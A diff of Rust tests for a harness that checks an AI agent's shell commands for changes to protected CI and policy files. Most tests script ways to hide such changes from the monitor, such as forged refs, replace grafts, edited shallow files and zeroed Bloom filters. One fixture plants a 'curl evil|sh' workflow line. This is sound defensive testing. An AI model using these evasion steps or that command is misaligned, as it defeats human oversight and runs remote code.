@@ -159,7 +159,7 @@ fn a_bash_edit_that_moves_a_record_to_a_gated_status_is_reported_and_not_blocked
         "{line}"
     );
     assert!(
-        msg(&v).contains("1 gated move(s)") && msg(&v).contains("was not prevented"),
+        msg(&v).contains("1 gated change(s)") && msg(&v).contains("was not prevented"),
         "{v}"
     );
 }
@@ -788,15 +788,6 @@ fn launder_by_stash_pop_is_reported() {
 }
 
 #[test]
-fn launder_by_a_forged_stash_marker_is_reported() {
-    let dir = launder_fixture("l-marker");
-    assert_reported_once(
-        &dir,
-        &[&format!("{A} && {W} && git add -A && c=$(git commit-tree $(git write-tree) -p HEAD -m x) && git reset -q && echo $c > .urzua/cache/post-command-stash")],
-    );
-}
-
-#[test]
 fn launder_by_reset_hard_to_a_built_commit_is_reported() {
     let dir = launder_fixture("l-reset");
     assert_reported_once(
@@ -850,7 +841,7 @@ fn launder_by_cherry_pick_is_reported() {
 }
 
 #[test]
-fn a_pull_of_a_protected_change_says_it_arrived_by_a_git_move_once() {
+fn a_pull_with_no_base_ref_reports_the_protected_change_at_full_weight() {
     let dir = launder_fixture("pull-protected");
     let up_dir = common::TempDir::new("urzua-postcmd-up");
     let parent = up_dir.join("up");
@@ -874,8 +865,8 @@ fn a_pull_of_a_protected_change_says_it_arrived_by_a_git_move_once() {
     let v = post(&dir);
     let person = v["person"].as_str().unwrap();
     assert!(
-        person.contains(".github/workflows/ci.yml") && person.contains("arrived by a git move"),
-        "{v}"
+        person.contains(".github/workflows/ci.yml") && person.contains("[protected-paths] error"),
+        "with no base ref to compare with, the change keeps full weight: {v}"
     );
     bash(&dir, "ls >/dev/null");
     assert_eq!(post(&dir)["verdict"], "allow");
@@ -964,11 +955,811 @@ fn a_finding_in_the_sessions_own_commit_merged_from_a_branch_is_reported_once() 
 }
 
 #[test]
-fn a_gated_move_the_agent_committed_itself_is_worded_as_its_own_change() {
+fn a_gated_move_the_agent_committed_itself_is_an_error_with_no_base_match() {
     let dir = launder_fixture("own-commit-wording");
     bash(&dir, &format!("{A} && git commit -qam b"));
     let v = post(&dir);
     let person = v["person"].as_str().unwrap();
-    assert!(person.contains("[acceptance]"), "{v}");
-    assert!(!person.contains("arrived by a git move"), "{v}");
+    assert!(person.contains("[acceptance] error"), "{v}");
+    assert!(v["base_match"].is_null(), "{v}");
+}
+
+/// An upstream repository with the gates, and a clone of it whose
+/// `origin/HEAD` is the base the post-command check compares with.
+fn cloned_fixture(name: &str) -> (common::TempDir, PathBuf, common::TempDir) {
+    cloned_fixture_with(name, None)
+}
+
+fn cloned_fixture_with(
+    name: &str,
+    post_command: Option<&str>,
+) -> (common::TempDir, PathBuf, common::TempDir) {
+    let up = launder_fixture(&format!("{name}-up"));
+    if let Some(decl) = post_command {
+        let config = LAUNDER_CONFIG.replace("post-command: {enabled: true}", decl);
+        std::fs::write(up.join(".urzua/config.yaml"), config).unwrap();
+        git(&up, &["commit", "-qam", "post-command keys"]);
+    }
+    let holder = common::TempDir::new(&format!("urzua-postcmd-{name}-clone"));
+    let dir = holder.join("work");
+    git(
+        &holder,
+        &["clone", "-q", up.to_str().unwrap(), dir.to_str().unwrap()],
+    );
+    git(&dir, &["config", "user.email", "t@example.com"]);
+    git(&dir, &["config", "user.name", "t"]);
+    assert_eq!(post(&dir)["verdict"], "allow");
+    (up, dir, holder)
+}
+
+fn upstream_change(up: &Path) {
+    bash(up, &format!("{A} && echo upstream >> .github/workflows/ci.yml && echo up > .github/workflows/new.yml && git add -A && git commit -qm upstream"));
+}
+
+#[test]
+fn a_fast_forward_pull_of_the_base_branch_is_one_plain_sentence() {
+    let (up, dir, _h) = cloned_fixture("ff-base");
+    upstream_change(&up);
+    bash(&dir, "git pull -q --ff-only");
+    let v = post(&dir);
+    assert_eq!(v["verdict"], "allow-with-warnings", "still printed: {v}");
+    let person = v["person"].as_str().unwrap();
+    assert_eq!(
+        person,
+        "urzua harness (post-command) info: the command changed 3 gated path(s) (docs/adr/ADR-1-a.md, .github/workflows/ci.yml, .github/workflows/new.yml), and each now holds exactly the content on origin/HEAD (origin/main), so nothing needs doing.",
+        "{v}"
+    );
+    assert!(!person.contains("error"), "{v}");
+    assert_eq!(v["base_match"]["paths"].as_array().unwrap().len(), 3, "{v}");
+    assert_eq!(v["base_match"]["level"], "info", "{v}");
+    bash(&dir, "ls >/dev/null");
+    assert_eq!(post(&dir)["verdict"], "allow");
+}
+
+#[test]
+fn a_pull_with_a_differing_shell_edit_keeps_the_edit_at_full_weight() {
+    let (up, dir, _h) = cloned_fixture("ff-mixed");
+    upstream_change(&up);
+    bash(
+        &dir,
+        "git pull -q --ff-only && echo evil > .github/workflows/evil.yml",
+    );
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.contains("[protected-paths] error (gate: ")
+            && person.contains(".github/workflows/evil.yml"),
+        "{v}"
+    );
+    assert!(
+        person.contains("info: 3 other gated path(s) (docs/adr/ADR-1-a.md, .github/workflows/ci.yml, .github/workflows/new.yml) now hold exactly the content on origin/HEAD (origin/main)"),
+        "{v}"
+    );
+    assert_eq!(
+        person.matches("[protected-paths]").count(),
+        1,
+        "one gate, named once: {v}"
+    );
+    let evil = v["protected_changes"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|l| l.as_str().unwrap().contains("evil.yml"))
+        .unwrap()
+        .as_str()
+        .unwrap();
+    assert!(evil.contains("[protected-paths] error:"), "{v}");
+}
+
+#[test]
+fn a_shell_edit_of_a_protected_path_not_on_the_base_branch_is_an_error() {
+    let (_up, dir, _h) = cloned_fixture("shell-edit");
+    bash(&dir, &format!("{W} && echo b >> .github/workflows/ci.yml"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.contains("[protected-paths] error") && person.contains(".github/workflows/ci.yml"),
+        "{v}"
+    );
+    assert!(v["base_match"].is_null(), "{v}");
+}
+
+#[test]
+fn launder_by_update_ref_of_the_remote_tracking_base_is_still_printed() {
+    let (_up, dir, _h) = cloned_fixture("forged");
+    bash(
+        &dir,
+        &format!("{W} && git commit -qam forged && git update-ref refs/remotes/origin/main HEAD"),
+    );
+    let v = post(&dir);
+    assert_eq!(v["verdict"], "allow-with-warnings", "{v}");
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.starts_with("urzua harness (post-command) info: the command changed 1 gated path(s) (.github/workflows/ci.yml)"),
+        "the forged match lowers the weight but is never silent, and names the path: {v}"
+    );
+}
+
+#[test]
+fn the_comparison_ref_and_the_level_come_from_configuration() {
+    let (up, dir, _h) = cloned_fixture_with(
+        "configured",
+        Some("post-command: {enabled: true, base: refs/remotes/origin/main, base_match: warning}"),
+    );
+    upstream_change(&up);
+    bash(&dir, "git pull -q --ff-only");
+    let v = post(&dir);
+    assert_eq!(
+        v["person"],
+        "urzua harness (post-command) warning: the command changed 3 gated path(s) (docs/adr/ADR-1-a.md, .github/workflows/ci.yml, .github/workflows/new.yml), and each now holds exactly the content on refs/remotes/origin/main (origin/main), so nothing needs doing.",
+        "{v}"
+    );
+    assert_eq!(v["base_match"]["level"], "warning", "{v}");
+}
+
+fn base_paths(v: &serde_json::Value) -> Vec<String> {
+    v["base_match"]["paths"]
+        .as_array()
+        .map(|a| a.iter().map(|p| p.as_str().unwrap().to_string()).collect())
+        .unwrap_or_default()
+}
+
+#[test]
+fn a_mode_change_does_not_match_the_base() {
+    let (up, dir, _h) = cloned_fixture("chmod");
+    upstream_change(&up);
+    bash(
+        &dir,
+        "git pull -q --ff-only && chmod +x .github/workflows/ci.yml",
+    );
+    let v = post(&dir);
+    assert!(
+        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
+        "{v}"
+    );
+    let person = v["person"].as_str().unwrap();
+    assert!(person.contains("[protected-paths] error"), "{v}");
+}
+
+#[test]
+fn a_symlink_to_a_copy_does_not_match_the_base() {
+    let (up, dir, h) = cloned_fixture("symlink");
+    upstream_change(&up);
+    let copy = h.join("copy.yml");
+    bash(
+        &dir,
+        &format!(
+            "git pull -q --ff-only && cp .github/workflows/ci.yml {c} && rm .github/workflows/ci.yml && ln -s {c} .github/workflows/ci.yml",
+            c = copy.display()
+        ),
+    );
+    let v = post(&dir);
+    assert!(
+        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
+        "{v}"
+    );
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+}
+
+#[test]
+fn a_command_that_points_the_base_at_its_own_commit_keeps_full_weight() {
+    let (_up, dir, _h) = cloned_fixture("own-base");
+    bash(
+        &dir,
+        &format!("sed -i 's/post-command: {{enabled: true}}/post-command: {{enabled: true, base: HEAD}}/' .urzua/config.yaml && {W} && git commit -qam x"),
+    );
+    let v = post(&dir);
+    assert!(v["base_match"].is_null(), "{v}");
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.contains("[protected-paths] error") && person.contains(".github/workflows/ci.yml"),
+        "{v}"
+    );
+}
+
+#[test]
+fn a_pull_that_brings_a_configuration_change_from_the_base_still_matches() {
+    let (up, dir, _h) = cloned_fixture("config-pull");
+    bash(&up, "echo '# upstream note' >> .urzua/config.yaml && echo upstream >> .github/workflows/ci.yml && git commit -qam cfg");
+    bash(&dir, "git pull -q --ff-only");
+    let v = post(&dir);
+    assert_eq!(
+        base_paths(&v),
+        vec![".github/workflows/ci.yml".to_string()],
+        "{v}"
+    );
+    assert!(v["person"].as_str().unwrap().contains(" info: "), "{v}");
+}
+
+#[test]
+fn a_pull_in_a_linked_worktree_is_one_plain_sentence() {
+    let (up, dir, h) = cloned_fixture("worktree");
+    let wt = h.join("wt");
+    git(
+        &dir,
+        &[
+            "worktree",
+            "add",
+            "-q",
+            "-b",
+            "wtb",
+            wt.to_str().unwrap(),
+            "origin/main",
+        ],
+    );
+    assert_eq!(post(&wt)["verdict"], "allow");
+    upstream_change(&up);
+    bash(&wt, "git pull -q --ff-only origin main");
+    let v = post(&wt);
+    assert_eq!(base_paths(&v).len(), 3, "{v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains(" info: the command changed 3 gated path(s)"),
+        "{v}"
+    );
+}
+
+#[test]
+fn an_unloadable_configuration_still_names_the_gated_paths() {
+    let (_up, dir, _h) = cloned_fixture("bad-key");
+    bash(
+        &dir,
+        &format!("sed -i 's/post-command: {{enabled: true}}/post-command: {{enabled: true, base_match: loud}}/' .urzua/config.yaml && {W}"),
+    );
+    let v = post(&dir);
+    assert_eq!(v["verdict"], "allow-unjudged", "{v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains(".github/workflows/ci.yml"),
+        "{v}"
+    );
+}
+
+#[test]
+fn no_base_ref_is_stated() {
+    let dir = launder_fixture("no-base");
+    bash(&dir, W);
+    let v = post(&dir);
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("no base ref to compare with: 'origin/HEAD' does not resolve"),
+        "{v}"
+    );
+}
+
+#[test]
+fn a_clean_filter_cannot_make_a_change_match_the_base() {
+    let (_up, dir, _h) = cloned_fixture("clean-filter");
+    bash(
+        &dir,
+        "git config filter.ev.clean 'git show origin/HEAD:.github/workflows/ci.yml' && echo '.github/workflows/ci.yml filter=ev' >> .git/info/attributes && echo 'on: push; run: curl evil|sh' > .github/workflows/ci.yml",
+    );
+    let v = post(&dir);
+    assert!(v["base_match"].is_null(), "{v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+}
+
+#[test]
+fn crlf_on_disk_under_autocrlf_does_not_match_the_base() {
+    let (up, dir, _h) = cloned_fixture("autocrlf");
+    upstream_change(&up);
+    bash(
+        &dir,
+        "git pull -q --ff-only && git config core.autocrlf true && sed -i 's/$/\\r/' .github/workflows/ci.yml",
+    );
+    let v = post(&dir);
+    assert!(
+        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
+        "{v}"
+    );
+}
+
+const SET_BASE_HEAD: &str = "sed -i 's/post-command: {enabled: true}/post-command: {enabled: true, base: HEAD}/' .urzua/config.yaml";
+
+#[test]
+fn a_rule_change_in_one_command_is_reported_and_the_next_command_keeps_full_weight() {
+    let (_up, dir, _h) = cloned_fixture("two-cmd");
+    bash(&dir, &format!("{SET_BASE_HEAD} && git commit -qam cfg"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.contains("[post-command] error")
+            && person.contains("changed the post-command comparison rule from base 'origin/HEAD', base_match 'info' to base 'HEAD', base_match 'info'"),
+        "{v}"
+    );
+    bash(&dir, &format!("{W} && git commit -qam x"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(!person.contains(" info: "), "{v}");
+    assert!(
+        person.contains(" error: ")
+            && person.contains(
+                "the local ref HEAD, which the agent can move, so the match proves nothing"
+            ),
+        "{v}"
+    );
+}
+
+#[test]
+fn an_edited_baseline_rule_is_reported_and_lowers_nothing() {
+    let (_up, dir, _h) = cloned_fixture("forged-cache");
+    bash(
+        &dir,
+        "sed -i 's/\"post_base\":\"origin\\/HEAD\"/\"post_base\":\"HEAD\"/' .urzua/cache/protected-hashes.json && grep -q '\"post_base\":\"HEAD\"' .urzua/cache/protected-hashes.json",
+    );
+    bash(&dir, &format!("{W} && git commit -qam x"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(person.contains("so the baseline was edited"), "{v}");
+    assert!(person.contains("[protected-paths] error"), "{v}");
+    assert!(v["base_match"].is_null(), "{v}");
+}
+
+#[test]
+fn a_local_base_never_lowers_the_report() {
+    let (_up, dir, _h) = cloned_fixture_with(
+        "local-base",
+        Some("post-command: {enabled: true, base: HEAD}"),
+    );
+    bash(&dir, &format!("{W} && git commit -qam x"));
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.starts_with("urzua harness (post-command) error: the command changed 1 gated path(s) (.github/workflows/ci.yml), and each now holds exactly the content on the local ref HEAD, which the agent can move, so the match proves nothing; a decider must review the listed paths."),
+        "{v}"
+    );
+    assert_eq!(v["base_match"]["level"], "error", "{v}");
+}
+
+#[test]
+fn a_pull_that_changes_the_rule_reports_the_change_once() {
+    let (up, dir, _h) = cloned_fixture("rule-pull");
+    bash(&up, "sed -i 's/post-command: {enabled: true}/post-command: {enabled: true, base_match: warning}/' .urzua/config.yaml && git commit -qam rule");
+    bash(&dir, "git pull -q --ff-only");
+    let v = post(&dir);
+    let person = v["person"].as_str().unwrap();
+    assert_eq!(
+        person
+            .matches("changed the post-command comparison rule")
+            .count(),
+        1,
+        "{v}"
+    );
+    bash(&dir, "ls >/dev/null");
+    assert_eq!(post(&dir)["verdict"], "allow");
+}
+
+#[test]
+fn at_base_match_error_the_sentence_does_not_say_nothing_needs_doing() {
+    let (up, dir, _h) = cloned_fixture_with(
+        "level-error",
+        Some("post-command: {enabled: true, base_match: error}"),
+    );
+    upstream_change(&up);
+    bash(&dir, "git pull -q --ff-only");
+    let person = post(&dir)["person"].as_str().unwrap().to_string();
+    assert!(
+        person.ends_with("now holds exactly the content on origin/HEAD (origin/main); a decider must review the listed paths.")
+            && person.contains(" error: ")
+            && !person.contains("nothing needs doing"),
+        "{person}"
+    );
+}
+
+const NON_UTF8: &str = "printf 'evil\\n' > \".github/workflows/$(printf '\\377').yml\"";
+
+#[test]
+fn a_file_name_that_is_not_utf8_never_matches() {
+    let (_up, dir, _h) = cloned_fixture("non-utf8");
+    bash(&dir, NON_UTF8);
+    let v = post(&dir);
+    assert!(v["base_match"].is_null(), "uncommitted: {v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+    let (_up2, dir2, _h2) = cloned_fixture("non-utf8-commit");
+    bash(
+        &dir2,
+        &format!("{NON_UTF8} && git add -A && git commit -qm x"),
+    );
+    let v = post(&dir2);
+    assert!(v["base_match"].is_null(), "committed: {v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+}
+
+#[test]
+fn a_file_a_pull_deleted_that_the_base_lacks_still_matches() {
+    let (up, dir, _h) = cloned_fixture("pull-delete");
+    bash(
+        &up,
+        "git rm -q .github/workflows/ci.yml && git commit -qm rm",
+    );
+    bash(&dir, "git pull -q --ff-only");
+    let v = post(&dir);
+    assert_eq!(
+        base_paths(&v),
+        vec![".github/workflows/ci.yml".to_string()],
+        "{v}"
+    );
+}
+
+/// A cloned fixture whose upstream installed the Claude Code adapter, so the
+/// translator runs as the host runs it.
+fn cloned_with_adapter(
+    name: &str,
+    post_command: Option<&str>,
+) -> (common::TempDir, PathBuf, common::TempDir, String) {
+    let up = launder_fixture(&format!("{name}-up"));
+    if let Some(decl) = post_command {
+        let config = LAUNDER_CONFIG.replace("post-command: {enabled: true}", decl);
+        std::fs::write(up.join(".urzua/config.yaml"), config).unwrap();
+    }
+    install(&up);
+    git(&up, &["add", "-A"]);
+    git(&up, &["commit", "-qm", "install"]);
+    let holder = common::TempDir::new(&format!("urzua-postcmd-{name}-clone"));
+    let dir = holder.join("work");
+    git(
+        &holder,
+        &["clone", "-q", up.to_str().unwrap(), dir.to_str().unwrap()],
+    );
+    git(&dir, &["config", "user.email", "t@example.com"]);
+    git(&dir, &["config", "user.name", "t"]);
+    let cmd = hook_command(&dir, "Bash");
+    let out = run_hook(&dir, &cmd, &payload(&dir, "Bash"), None);
+    assert!(out.stdout.is_empty(), "{out:?}");
+    (up, dir, holder, cmd)
+}
+
+fn audiences(dir: &Path, cmd: &str) -> (String, String) {
+    let v = json(&run_hook(dir, cmd, &payload(dir, "Bash"), None));
+    (
+        v["systemMessage"].as_str().unwrap_or("").to_string(),
+        v["hookSpecificOutput"]["additionalContext"]
+            .as_str()
+            .unwrap_or("")
+            .to_string(),
+    )
+}
+
+#[test]
+fn the_agent_gets_its_own_line_when_every_gated_change_matches() {
+    let (up, dir, _h, cmd) = cloned_with_adapter("agent-match", None);
+    upstream_change(&up);
+    bash(&dir, "git pull -q --ff-only");
+    let (person, agent) = audiences(&dir, &cmd);
+    assert!(person.contains("nothing needs doing"), "{person}");
+    assert!(
+        agent.contains("3 gated change(s) match origin/HEAD (origin/main); nothing to do."),
+        "{agent}"
+    );
+}
+
+#[test]
+fn the_agent_gets_its_own_line_when_the_base_is_a_local_ref() {
+    let (_up, dir, _h, cmd) = cloned_with_adapter(
+        "agent-local",
+        Some("post-command: {enabled: true, base: HEAD}"),
+    );
+    bash(&dir, &format!("{W} && git commit -qam x"));
+    let (person, agent) = audiences(&dir, &cmd);
+    assert!(person.contains("proves nothing"), "{person}");
+    assert!(
+        agent.contains("1 gated change(s) match the local ref HEAD, which proves nothing; a decider must make or approve them"),
+        "{agent}"
+    );
+}
+
+#[test]
+fn the_agent_gets_its_own_line_in_a_mixed_report() {
+    let (up, dir, _h, cmd) = cloned_with_adapter("agent-mixed", None);
+    upstream_change(&up);
+    bash(
+        &dir,
+        "git pull -q --ff-only && echo evil > .github/workflows/evil.yml",
+    );
+    let (person, agent) = audiences(&dir, &cmd);
+    assert!(person.contains("evil.yml"), "{person}");
+    assert!(
+        agent.contains("a decider must make or approve these") && agent != person,
+        "{agent}"
+    );
+}
+
+fn assert_full_weight(dir: &Path, cmd: &str) {
+    bash(dir, cmd);
+    let v = post(dir);
+    assert!(v["base_match"].is_null(), "{cmd}: {v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{cmd}: {v}"
+    );
+}
+
+#[test]
+fn base_bytes_on_disk_over_a_different_commit_do_not_match() {
+    let (_up, dir, _h) = cloned_fixture("restore-commit");
+    assert_full_weight(&dir, "echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git restore --source=origin/main --worktree .github/workflows/ci.yml && git commit -qm x");
+}
+
+#[test]
+fn a_committed_file_removed_from_disk_does_not_match() {
+    let (_up, dir, _h) = cloned_fixture("commit-rm");
+    assert_full_weight(&dir, "echo evil > .github/workflows/e.yml && git add -A && git commit -qm x && rm .github/workflows/e.yml");
+}
+
+#[test]
+fn base_bytes_on_disk_over_a_different_index_do_not_match() {
+    let (_up, dir, _h) = cloned_fixture("restore-index");
+    assert_full_weight(&dir, "echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git restore --source=origin/main --worktree .github/workflows/ci.yml");
+}
+
+#[test]
+fn a_pull_with_an_unrelated_local_commit_still_matches() {
+    let (up, dir, _h) = cloned_fixture("pull-unrelated");
+    upstream_change(&up);
+    bash(
+        &dir,
+        "git pull -q --ff-only && echo x > notes.txt && git add notes.txt && git commit -qm notes",
+    );
+    let v = post(&dir);
+    assert_eq!(base_paths(&v).len(), 3, "{v}");
+}
+
+#[test]
+fn a_change_hidden_in_a_merge_commit_does_not_match() {
+    let (up, dir, _h) = cloned_fixture("two-merge");
+    upstream_change(&up);
+    bash(&dir, "git pull -q --ff-only && git checkout -qb s1 && echo 1 > src/s1.rs && git add -A && git commit -qm s1 && git checkout -qb s2 main && echo 2 > src/s2.rs && git add -A && git commit -qm s2 && git checkout -q main && git merge -q --no-ff --no-commit s1 && echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git commit -qm M1 && git merge -q --no-ff --no-commit s2 && git checkout -q origin/main -- .github/workflows/ci.yml && git commit -qm M2");
+    let v = post(&dir);
+    assert!(
+        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
+        "{v}"
+    );
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+}
+
+#[test]
+fn a_real_merge_of_the_base_into_local_commits_still_matches() {
+    let (up, dir, _h) = cloned_fixture("real-merge");
+    bash(
+        &dir,
+        "echo x > notes.txt && git add notes.txt && git commit -qm notes",
+    );
+    assert_eq!(post(&dir)["verdict"], "allow");
+    upstream_change(&up);
+    bash(&dir, "git pull -q --no-rebase --no-edit");
+    let v = post(&dir);
+    assert_eq!(base_paths(&v).len(), 3, "{v}");
+}
+
+#[test]
+fn an_evil_merge_resolution_does_not_match() {
+    let (up, dir, _h) = cloned_fixture("evil-merge");
+    bash(
+        &dir,
+        "echo x > notes.txt && git add notes.txt && git commit -qm notes",
+    );
+    assert_eq!(post(&dir)["verdict"], "allow");
+    upstream_change(&up);
+    bash(&dir, "git pull -q --no-rebase --no-commit && echo evil >> .github/workflows/ci.yml && git add .github/workflows/ci.yml && git commit -qm merge");
+    let v = post(&dir);
+    assert!(
+        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
+        "{v}"
+    );
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+}
+
+fn assert_rewritten(dir: &Path, cmd: &str) {
+    bash(dir, cmd);
+    let v = post(dir);
+    assert!(v["base_match"].is_null(), "{cmd}: {v}");
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.contains("[protected-paths] error")
+            && person.contains(
+                "replace refs or grafts are present, so nothing was compared with the base"
+            ),
+        "{cmd}: {v}"
+    );
+}
+
+const EVIL_THEN_BASE: &str = "echo evil >> .github/workflows/ci.yml && git commit -qam E && git checkout -q origin/main -- .github/workflows/ci.yml && git commit -qam F";
+
+#[test]
+fn a_replace_graft_does_not_make_a_change_match() {
+    let (up, dir, _h) = cloned_fixture("replace-graft");
+    upstream_change(&up);
+    assert_rewritten(
+        &dir,
+        &format!(
+            "git pull -q --ff-only && {EVIL_THEN_BASE} && git replace --graft HEAD origin/main"
+        ),
+    );
+}
+
+#[test]
+fn a_grafts_file_does_not_make_a_change_match() {
+    let (up, dir, _h) = cloned_fixture("grafts-file");
+    upstream_change(&up);
+    assert_rewritten(&dir, &format!("git pull -q --ff-only && {EVIL_THEN_BASE} && echo \"$(git rev-parse HEAD) $(git rev-parse origin/main)\" > \"$(git rev-parse --git-path info/grafts)\""));
+}
+
+#[test]
+fn replacing_the_base_after_a_pull_does_not_make_a_change_match() {
+    let (up, dir, _h) = cloned_fixture("replace-after-pull");
+    upstream_change(&up);
+    assert_rewritten(&dir, "git pull -q --ff-only && echo evil >> .github/workflows/ci.yml && git commit -qam E && git replace origin/main HEAD");
+}
+
+#[test]
+fn replacing_the_base_does_not_make_a_change_match() {
+    let (_up, dir, _h) = cloned_fixture("replace-base");
+    assert_rewritten(
+        &dir,
+        &format!("{W} && git commit -qam E && git replace origin/main HEAD"),
+    );
+}
+
+#[test]
+fn a_shallow_clones_pull_still_matches() {
+    let up = launder_fixture("shallow-up");
+    let holder = common::TempDir::new("urzua-postcmd-shallow-clone");
+    let dir = holder.join("work");
+    let url = format!("file://{}", up.display());
+    git(
+        &holder,
+        &["clone", "-q", "--depth", "1", &url, dir.to_str().unwrap()],
+    );
+    git(&dir, &["config", "user.email", "t@example.com"]);
+    git(&dir, &["config", "user.name", "t"]);
+    assert_eq!(post(&dir)["verdict"], "allow");
+    upstream_change(&up);
+    bash(&dir, "git pull -q --ff-only");
+    let v = post(&dir);
+    assert_eq!(base_paths(&v).len(), 3, "{v}");
+}
+
+const SHALLOW_GRAFT: &str = "git config log.showRoot false && git pull -q --ff-only && echo evil >> .github/workflows/ci.yml && git commit -qam E && git show origin/main:.github/workflows/ci.yml > .github/workflows/ci.yml && git commit -qam F && git rev-parse HEAD >> \"$(git rev-parse --git-path shallow)\"";
+
+fn assert_truncated(dir: &Path) {
+    bash(dir, SHALLOW_GRAFT);
+    let v = post(dir);
+    assert!(v["base_match"].is_null(), "{v}");
+    let person = v["person"].as_str().unwrap();
+    assert!(
+        person.contains("[protected-paths] error")
+            && person.contains("the command truncated the history"),
+        "{v}"
+    );
+}
+
+#[test]
+fn a_hand_edited_shallow_file_does_not_make_a_change_match() {
+    let (up, dir, _h) = cloned_fixture("shallow-graft");
+    upstream_change(&up);
+    assert_truncated(&dir);
+}
+
+#[test]
+fn a_hand_edited_shallow_file_in_a_shallow_clone_does_not_make_a_change_match() {
+    let up = launder_fixture("shallow-graft-depth-up");
+    let holder = common::TempDir::new("urzua-postcmd-shallow-graft-depth-clone");
+    let dir = holder.join("work");
+    let url = format!("file://{}", up.display());
+    git(
+        &holder,
+        &["clone", "-q", "--depth", "1", &url, dir.to_str().unwrap()],
+    );
+    git(&dir, &["config", "user.email", "t@example.com"]);
+    git(&dir, &["config", "user.name", "t"]);
+    assert_eq!(post(&dir)["verdict"], "allow");
+    upstream_change(&up);
+    assert_truncated(&dir);
+}
+
+/// Zeroes the changed-path (Bloom) filter data of the commit-graph, so a
+/// path-limited walk that trusts it skips every commit.
+const ZERO_BLOOM: &str = r#"chmod u+w "$(git rev-parse --git-path objects/info/commit-graph)" && python3 -I -c '
+import sys
+p = sys.argv[1]
+b = bytearray(open(p, "rb").read())
+n = b[6]
+table = [(bytes(b[8 + 12 * i:12 + 12 * i]), int.from_bytes(b[12 + 12 * i:20 + 12 * i], "big")) for i in range(n + 1)]
+for k, (cid, off) in enumerate(table[:-1]):
+    if cid == b"BDAT":
+        end = table[k + 1][1]
+        b[off + 12:end] = bytes(end - off - 12)
+        open(p, "wb").write(bytes(b))
+        sys.exit(0)
+sys.exit(1)
+' "$(git rev-parse --git-path objects/info/commit-graph)""#;
+
+#[test]
+fn a_forged_changed_path_filter_does_not_make_a_change_match() {
+    let (up, dir, _h) = cloned_fixture("bloom");
+    upstream_change(&up);
+    bash(&dir, &format!("git pull -q --ff-only && {EVIL_THEN_BASE} && git commit-graph write --reachable --changed-paths && {ZERO_BLOOM}"));
+    let v = post(&dir);
+    assert!(
+        !base_paths(&v).contains(&".github/workflows/ci.yml".to_string()),
+        "{v}"
+    );
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("[protected-paths] error"),
+        "{v}"
+    );
+}
+
+#[test]
+fn an_orphan_root_commit_of_the_command_does_not_match() {
+    let (up, dir, _h) = cloned_fixture("orphan-root");
+    upstream_change(&up);
+    assert_full_weight(
+        &dir,
+        "git config log.showRoot false && git pull -q --ff-only && git checkout -q --orphan o && git commit -qm root",
+    );
+}
+
+#[test]
+fn a_shallow_line_with_a_non_utf8_byte_still_counts() {
+    let (up, dir, _h) = cloned_fixture("shallow-bytes");
+    upstream_change(&up);
+    bash(&dir, &format!("git pull -q --ff-only && {EVIL_THEN_BASE} && printf '%s\\377\\n' \"$(git rev-parse HEAD)\" >> \"$(git rev-parse --git-path shallow)\""));
+    let v = post(&dir);
+    assert!(v["base_match"].is_null(), "{v}");
+    assert!(
+        v["person"]
+            .as_str()
+            .unwrap()
+            .contains("the command truncated the history"),
+        "{v}"
+    );
 }
